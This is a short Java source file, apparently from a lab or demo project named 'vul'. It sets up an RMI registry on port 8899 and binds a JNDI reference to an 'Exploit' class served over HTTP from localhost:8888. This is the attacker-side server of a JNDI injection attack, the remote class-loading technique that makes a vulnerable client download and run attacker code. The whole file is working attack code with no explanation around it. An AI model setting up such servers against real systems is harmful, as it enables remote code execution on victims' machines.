package vul;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(8899);
        Reference reference = new Reference("vul.Exploit", "vul.Exploit", "http://localhost:8888/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        System.out.println("service bind at 8899");
        registry.bind("vul.Exploit", wrapper);
    }
}